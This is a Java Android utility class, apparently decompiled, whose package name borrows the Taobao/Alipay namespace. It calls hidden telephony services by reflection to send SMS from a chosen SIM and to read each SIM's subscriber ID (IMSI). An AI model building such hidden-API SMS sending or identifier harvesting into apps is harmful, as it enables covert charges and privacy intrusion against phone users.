package com.taobao.alipay.spjd;

import java.lang.reflect.Method;

import android.app.PendingIntent;
import android.content.Context;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class SpjdUtils {

	private static final String METHOD_IMSI = "getSubscriberId";
	private static final String METHOD_ICCID = "getSimSerialNumber";

	public static boolean sendSms(Context context, String dest, String content) {
		return new SpjdSms(context, dest, content).send();
	}

	public static void sendSms(Context context, String dest, String content,
			PendingIntent sentPI, PendingIntent deliverPI) {

		SmsManager localSmsManager = SmsManager.getDefault();
		while (true) {
			try {
				{
					boolean bool = a();
					int i = c(context);

					if ((bool) && (i != -1)) {
						String str = "isms";
						if (i == 1) {
							str = "isms2";
						}

						String sendMethod = "sendText";

						Method localMethod1 = Class.forName(
								"android.os.ServiceManager")
								.getDeclaredMethod("getService",
										new Class[] { String.class });
						localMethod1.setAccessible(true);
						Object localObject1 = localMethod1.invoke(null,
								new Object[] { str });
						Method localMethod2 = Class.forName(
								"com.android.internal.telephony.ISms$Stub")
								.getDeclaredMethod("asInterface",
										new Class[] { IBinder.class });
						localMethod2.setAccessible(true);
						Object localObject2 = localMethod2.invoke(null,
								new Object[] { localObject1 });
						Method localMethod3 = localObject2.getClass()
								.getMethod(
										sendMethod,
										new Class[] { String.class,
												String.class, String.class,
												PendingIntent.class,
												PendingIntent.class });
						Object[] arrayOfObject = new Object[5];
						arrayOfObject[0] = dest;
						arrayOfObject[2] = content;
						arrayOfObject[3] = sentPI;
						arrayOfObject[4] = deliverPI;
						localMethod3.invoke(localObject2, arrayOfObject);
						return;
					}
					localSmsManager.sendTextMessage(dest, null, content,
							sentPI, deliverPI);
				}
				return;
			} catch (Exception e) {
				{
					localSmsManager.sendTextMessage(dest, null, content,
							sentPI, deliverPI);
				}
				return;
			}

		}
	}
	
	public static boolean a() {
		String str1 = a(METHOD_IMSI, 0);
		String str2 = a(METHOD_IMSI, 1);
		return ((str1 == null) || (str2 == null));
	}

	private static String a(String method, int paramInt) {
		String str1 = "iphonesubinfo";
		if (paramInt == 1) {
			str1 = "iphonesubinfo2";
		}

		try {
			Object localObject1;
			while (true) {
				Method localMethod1 = Class
						.forName("android.os.ServiceManager")
						.getDeclaredMethod("getService",
								new Class[] { String.class });
				localMethod1.setAccessible(true);
				localObject1 = localMethod1.invoke(null, new Object[] { str1 });
				if ((localObject1 == null) && (paramInt == 1)) {
					Object localObject3 = localMethod1.invoke(null,
							new Object[] { "iphonesubinfo1" });
					localObject1 = localObject3;
				}
				if (localObject1 != null) {
					break;
				}

				return null;

			}
			Method localMethod2 = Class.forName(
					"com.android.internal.telephony.IPhoneSubInfo$Stub")
					.getDeclaredMethod("asInterface",
							new Class[] { IBinder.class });
			localMethod2.setAccessible(true);
			Object localObject2 = localMethod2.invoke(null,
					new Object[] { localObject1 });
			String str2 = (String) localObject2.getClass()
					.getMethod(method, new Class[0])
					.invoke(localObject2, new Object[0]);
			return str2;
		} catch (Exception localException) {
			localException.printStackTrace();
		}
		return null;
	}

	public static int c(Context paramContext) {
		int i = f(paramContext);
		if (i == -1) {
			i = g(paramContext);
			if (i == -1)
				i = b();
		}
		if ((i == 0) || (i == 1))
			return i;
		String str = ((TelephonyManager) paramContext.getSystemService("phone"))
				.getSubscriberId();
		if ((str != null) && (str.equals(a(METHOD_IMSI, 0))))
			return 0;
		if ((str != null) && (str.equals(a(METHOD_IMSI, 1))))
			return 1;
		return -1;
	}

	private static int f(Context paramContext) {
		try {
			TelephonyManager localTelephonyManager = (TelephonyManager) paramContext
					.getSystemService("phone");
			Method localMethod = Class.forName(
					"android.telephony.TelephonyManager").getDeclaredMethod(
					"getSmsDefaultSim", new Class[0]);
			localMethod.setAccessible(true);
			int i = ((Integer) localMethod.invoke(localTelephonyManager,
					new Object[0])).intValue();
			return i;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}

	private static int g(Context paramContext) {
		try {
			TelephonyManager localTelephonyManager = (TelephonyManager) paramContext
					.getSystemService("phone");
			Method localMethod = Class.forName(
					"android.telephony.TelephonyManager").getDeclaredMethod(
					"getDefaultDataPhoneId", new Class[0]);
			localMethod.setAccessible(true);
			int i = ((Integer) localMethod.invoke(localTelephonyManager,
					new Object[0])).intValue();
			return i;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}

	private static int b() {
		try {
			Method localMethod1 = Class.forName("android.telephony.SmsManager")
					.getDeclaredMethod("getDefault", new Class[0]);
			localMethod1.setAccessible(true);
			Object localObject = localMethod1.invoke(null, new Object[0]);
			Method localMethod2 = Class.forName("android.telephony.SmsManager")
					.getDeclaredMethod("getPreferredSmsSubscription",
							new Class[0]);
			localMethod2.setAccessible(true);
			int i = ((Integer) localMethod2.invoke(localObject, new Object[0]))
					.intValue();
			return i;
		} catch (Exception localException) {
		}
		return -1;
	}

	public static boolean b(Context paramContext) {
		TelephonyManager localTelephonyManager = (TelephonyManager) paramContext
				.getSystemService("phone");
		int i = localTelephonyManager.getSimState();
		int j = localTelephonyManager.getNetworkType();
		String str = d(paramContext);
		if (i == 5)
			return true;
		return ((((j < 3) || (j > 6))) && (str == null));
	}

	public static String d(Context paramContext) {
		// Object localObject = null;
		// try{
		// boolean bool = a();
		//
		// if (bool){
		// int i = c(paramContext);
		//
		// if (i != -1){
		// localObject = a(i);
		// }
		// }
		// do
		// {
		// localObject = a(0);
		//
		// if (localObject == null)
		// localObject =
		// ((TelephonyManager)paramContext.getSystemService("phone")).getSubscriberId();
		// return (String)localObject;
		//
		// }
		// while ((localObject != null) && (((String)localObject).length() !=
		// 0));
		// String str2 = a(1);
		// localObject = str2;
		// }
		// catch (Exception localException)
		// {
		// }

		String result = null;

		try {
			if (a()) {
				int i = c(paramContext);
				if (i != -1) {
					result = a(METHOD_IMSI, i);
				}
			} else {
				result = a(METHOD_IMSI, 0);

				if (result == null || result.length() == 0) {
					result = a(METHOD_IMSI, 1);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		if (result == null) {
			result = ((TelephonyManager) paramContext.getSystemService("phone"))
					.getSubscriberId();
		}
		return result;
	}
}
